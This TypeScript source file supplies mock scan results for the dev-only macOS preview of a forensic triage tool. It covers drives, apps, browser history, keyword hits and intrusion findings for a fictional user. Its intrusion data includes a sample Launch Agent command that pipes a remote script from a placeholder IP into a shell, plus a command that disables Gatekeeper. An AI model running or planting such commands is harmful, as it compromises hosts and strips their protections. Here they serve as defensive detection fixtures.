// Canned results for the dev-only Mac UI preview (see MAC_PREVIEW in
// hostPlatform.ts). Loaded ONLY through `await import()` inside
// `if (MAC_PREVIEW)` branches; MAC_PREVIEW is statically false in `vite build`,
// so Rollup drops those branches and this module never reaches a shipped bundle.
//
// Shapes mirror what the macOS backend emits (system_info/macos.rs,
// scanner/macos_apps.rs, scanner/browser.rs, scanner/macos_intrusion.rs) for a
// host WITHOUT Full Disk Access — hence no Safari and a list of skipped folders.
import type { DriveInfo } from '../types/drive';
import type { SystemInfo } from '../types/system';
import type { QuestionableApp } from '../types/scanner';
import type { BrowserData } from '../types/browser';
import type { KeywordMatch } from '../types/keyword';
import type { IntrusionScanResults } from '../types/intrusion';

const GB = 1024 ** 3;

/** What `get_available_drives` returns on a Mac: `/` first, the Scout stick already dropped. */
export const PREVIEW_MAC_DRIVES: DriveInfo[] = [
  { letter: '/', label: 'Macintosh HD (System)', driveType: 'Fixed', totalSpace: 494 * GB, freeSpace: 212 * GB },
  { letter: '/Volumes/EVIDENCE', label: 'EVIDENCE', driveType: 'Removable', totalSpace: 64 * GB, freeSpace: 41 * GB },
];

const HOME = '/Users/jdoe';
const now = () => new Date().toISOString();
const daysAgo = (d: number) => new Date(Date.now() - d * 86_400_000).toISOString();

export interface MacPreviewResults {
  systemInfo: SystemInfo;
  apps: QuestionableApp[];
  browsers: BrowserData[];
  keywordMatches: KeywordMatch[];
  intrusion: IntrusionScanResults;
  skippedProtected: string[];
}

export function macPreviewResults(): MacPreviewResults {
  const systemInfo: SystemInfo = {
    scan_id: 'preview-0000',
    scan_timestamp: now(),
    computer_name: 'Sample MacBook Pro (UI PREVIEW — not real data)',
    os_version: 'macOS 14.5 (Build 23F79)',
    registered_owner: null,
    registered_organization: null,
    product_id: null,
    domain: null,
    user_accounts: [
      { username: 'jdoe', full_name: 'Jane Doe', profile_path: HOME, last_login: null, account_type: 'Administrator' },
      { username: 'kid', full_name: 'Kid Doe', profile_path: '/Users/kid', last_login: null, account_type: 'Standard' },
    ],
    emails: ['jane.doe@example.com'],
    hardware: {
      drives: [
        { letter: '/', label: 'Macintosh HD', serial_number: '', filesystem: 'apfs', total_space: 494 * GB, free_space: 212 * GB },
        { letter: '/Volumes/EVIDENCE', label: 'EVIDENCE', serial_number: '', filesystem: 'exfat', total_space: 64 * GB, free_space: 41 * GB },
      ],
      motherboard_serial: null,
      bios_serial: 'C02XK1ABCDEF',
      system_uuid: '1A2B3C4D-0000-1111-2222-333344445555',
    },
    network: {
      mac_addresses: ['a4:83:e7:12:34:56'],
      hostname: 'Janes-MacBook-Pro',
      ip_addresses: ['192.168.1.23'],
      public_ip: null, // offline by design on macOS (G9)
    },
    usb_history: [], // no persistent USB store readable without root
    bitlocker: {
      supported: false,
      elevated: false,
      status: 'Not Supported',
      status_detail: 'BitLocker is a Windows feature.',
      volumes: [],
      key_files: [],
      sweep_scope: 'none',
      error: null,
    },
  };

  const app = (
    name: string, path: string, version: string, cat: QuestionableApp['category'], inv: string, conf: number,
  ): QuestionableApp => ({
    name, category: cat, install_path: path, version, install_date: daysAgo(120), publisher: null,
    artifact_paths: [`${HOME}/Library/Application Support/${name}`], investigative_category: inv,
    function_category: cat, confidence: conf,
  });
  const apps: QuestionableApp[] = [
    app('Tor Browser', '/Applications/Tor Browser.app', '13.5.1', 'DarkWeb', 'DARKWEB_P2P', 0.95),
    app('Signal', '/Applications/Signal.app', '7.14.0', 'Messaging', 'COMMUNICATIONS', 0.9),
    app('Telegram', '/Applications/Telegram.app', '10.13', 'Messaging', 'COMMUNICATIONS', 0.9),
    app('NordVPN', '/Applications/NordVPN.app', '8.20.1', 'VPN', 'VPN_REMOTE_ACCESS', 0.9),
    app('AnyDesk', '/Applications/AnyDesk.app', '8.0.10', 'RemoteAccess', 'VPN_REMOTE_ACCESS', 0.85),
    app('CCleaner', '/Applications/CCleaner.app', '2.9', 'Cleaner', 'ANONYMITY_ANTI_FORENSICS', 0.9),
    app('Exodus', '/Applications/Exodus.app', '24.21.3', 'CryptoPayment', 'CRYPTOCURRENCY', 0.9),
    app('UTM', '/Applications/UTM.app', '4.5.3', 'VirtualMachine', 'VIRTUAL_MACHINE', 0.85),
  ];

  const browsers: BrowserData[] = [
    {
      browserType: 'Chrome', browserName: 'Google Chrome', profileName: 'Default',
      installPath: '/Applications/Google Chrome.app',
      profilePath: `${HOME}/Library/Application Support/Google/Chrome/Default`,
      history: [
        { url: 'https://mega.nz/folder/abc', title: 'MEGA', visitCount: 14, lastVisit: daysAgo(1), typedCount: 3 },
        { url: 'https://www.google.com/search?q=how+to+wipe+mac', title: 'how to wipe mac - Google Search', visitCount: 2, lastVisit: daysAgo(2), typedCount: 1 },
        { url: 'https://web.telegram.org/', title: 'Telegram Web', visitCount: 40, lastVisit: daysAgo(0), typedCount: 5 },
      ],
      bookmarks: [{ url: 'https://protonmail.com', title: 'Proton Mail', dateAdded: daysAgo(90), folder: 'Bookmarks Bar' }],
      credentials: [{ originUrl: 'https://accounts.google.com', username: 'jane.doe@example.com', passwordEncrypted: true, dateCreated: daysAgo(300), dateLastUsed: daysAgo(3) }],
      downloads: [{
        targetPath: `${HOME}/Downloads/TorBrowser-13.5.1-macos_ALL.dmg`, url: 'https://www.torproject.org/dist/torbrowser/13.5.1/',
        startTime: daysAgo(120), endTime: daysAgo(120), totalBytes: 156_000_000, dangerType: 'NOT_DANGEROUS', state: 'COMPLETE',
        mimeType: 'application/x-apple-diskimage', referrerUrl: 'https://www.torproject.org/download/',
      }],
    },
    {
      browserType: 'Firefox', browserName: 'Mozilla Firefox', profileName: 'default-release',
      installPath: '/Applications/Firefox.app',
      profilePath: `${HOME}/Library/Application Support/Firefox/Profiles/x1y2z3.default-release`,
      history: [{ url: 'https://duckduckgo.com/?q=signal+disappearing+messages', title: 'DuckDuckGo', visitCount: 1, lastVisit: daysAgo(5), typedCount: 1 }],
      bookmarks: [], credentials: [], downloads: [],
    },
  ];

  const keywordMatches: KeywordMatch[] = [
    {
      filePath: '/Volumes/EVIDENCE/notes/ledger.txt', fileName: 'ledger.txt', fileSize: 4_812,
      matchedKeywords: ['bitcoin'], fileExtension: 'txt', dateModified: daysAgo(4),
      matchLocations: [{ keyword: 'bitcoin', location: 'FileContent', context: '…send 0.4 bitcoin to the usual wallet…' }],
    },
    {
      filePath: `${HOME}/.Trash/burner-contacts.csv`, fileName: 'burner-contacts.csv', fileSize: 1_204,
      matchedKeywords: ['burner'], fileExtension: 'csv', dateModified: daysAgo(9),
      matchLocations: [{ keyword: 'burner', location: 'FileName', context: 'burner-contacts.csv' }],
    },
  ];

  const intrusion: IntrusionScanResults = {
    eventLogAnomalies: [],
    persistenceItems: [
      { persistenceType: 'Launch Agent (jdoe)', name: 'com.update.helper.plist', targetPath: '/bin/zsh -c curl -s http://198.51.100.7/p | sh', location: `${HOME}/Library/LaunchAgents`, timestamp: daysAgo(6), suspicious: true },
      { persistenceType: 'Launch Daemon', name: 'com.anydesk.anydesk.plist', targetPath: '/Applications/AnyDesk.app/Contents/MacOS/AnyDesk', location: '/Library/LaunchDaemons', timestamp: daysAgo(120), suspicious: false },
    ],
    commandHistory: [
      { commandType: 'zsh (jdoe)', command: 'sudo spctl --master-disable', timestamp: daysAgo(6), sourcePath: `${HOME}/.zsh_history`, suspicious: true },
      { commandType: 'zsh (jdoe)', command: 'rm -P ~/Documents/old_ledger.xlsx', timestamp: daysAgo(4), sourcePath: `${HOME}/.zsh_history`, suspicious: true },
    ],
    userAccountChanges: [],
    remoteAccessIndicators: [
      { indicatorType: 'remote_tool_installed', toolName: 'AnyDesk', details: '/Applications/AnyDesk.app with a system LaunchDaemon', riskLevel: 'HIGH' },
      { indicatorType: 'ssh_authorized_keys', toolName: 'SSH', username: 'jdoe', details: '1 authorized key (comment: admin@vps)', riskLevel: 'MEDIUM' },
    ],
    securityToolTampering: [
      { tamperType: 'gatekeeper_disabled', component: 'Gatekeeper', details: 'assessments disabled', riskLevel: 'HIGH' },
    ],
    networkIndicators: [],
    malwareIndicators: [],
    browserHijacking: [],
    summary: {
      totalArtifacts: 7, criticalFindings: 0, highRiskFindings: 3, mediumRiskFindings: 1, lowRiskFindings: 3,
      overallRiskScore: 62,
      recommendations: ['Image the Mac — a Launch Agent pipes a remote script into a shell.', 'Gatekeeper was disabled from the shell.'],
    },
  };

  const skippedProtected = [
    `${HOME}/Desktop`,
    `${HOME}/Documents`,
    `${HOME}/Downloads`,
    `${HOME}/Library/Safari`,
    `${HOME}/Library/Mail`,
    `${HOME}/Library/Messages`,
  ];

  return { systemInfo, apps, browsers, keywordMatches, intrusion, skippedProtected };
}

/**
 * USB Drive card on a (mocked) Mac: what `get_usb_device_info` returns on
 * macOS for `/Volumes/X` (usb_device.rs `usb_info_from_diskutil`), plus a
 * keyword hit that lives on that volume.
 */
export function macPreviewUsbResults(mount: string): Pick<MacPreviewResults, 'systemInfo' | 'keywordMatches'> {
  const vol = PREVIEW_MAC_DRIVES.find(d => d.letter === mount);
  const total = (vol?.totalSpace ?? 64 * GB) / GB;
  const free = (vol?.freeSpace ?? 41 * GB) / GB;
  const systemInfo: SystemInfo = {
    scan_id: 'preview-usb-0000',
    scan_timestamp: now(),
    computer_name: 'USB Scan',
    os_version: '',
    registered_owner: null,
    registered_organization: null,
    product_id: null,
    domain: null,
    usb_device_info: {
      drive_letter: mount,
      drive_name: vol?.label ?? mount.split('/').pop() ?? mount,
      make: null,
      model: 'SanDisk Ultra (UI PREVIEW — not real data)',
      capacity_gb: total,
      used_space_gb: total - free,
      free_space_gb: free,
      file_count: 0,
      serial_number: '0E239BC6-F960-3107-89CF-1C97F78BB46B',
      volume_id: 'disk4s1',
    },
  };
  const keywordMatches = macPreviewResults().keywordMatches.filter(m => m.filePath.startsWith(`${mount}/`));
  return { systemInfo, keywordMatches };
}
